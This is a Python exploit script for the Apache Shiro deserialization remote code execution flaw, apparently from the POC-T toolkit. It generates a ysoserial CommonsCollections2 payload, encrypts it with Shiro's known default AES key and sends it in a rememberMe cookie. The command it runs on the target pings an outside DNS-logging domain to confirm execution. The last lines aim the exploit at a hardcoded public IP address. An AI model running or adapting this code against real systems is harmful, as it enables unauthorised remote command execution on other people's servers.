#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author = i@cdxy.me
# project = https://github.com/Xyntax/POC-T

"""
Apache Shiro 反序列化 远程命令执行
python POC-T.py -T -m shiro-deserial-rce -s 127.0.0.1:8080
"""

import os
import re
import base64
import uuid
import subprocess
import requests
from Crypto.Cipher import AES

JAR_FILE = './ysoserial-0.0.5-all.jar'



def poc(url):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url

    domain = "shiro.zqmn19.ceye.io" # 设置dns特征域名组
    rce_command = 'ping -n 3 %s || ping -c 3 %s' % (domain, domain)  # 目标机执行的代码
    payload = generator(rce_command, JAR_FILE)  # 生成payload
    test = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)  # 发送验证请求
    # print test.text



def generator(command, fp):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

u = "34.85.106.7:80"
poc(u)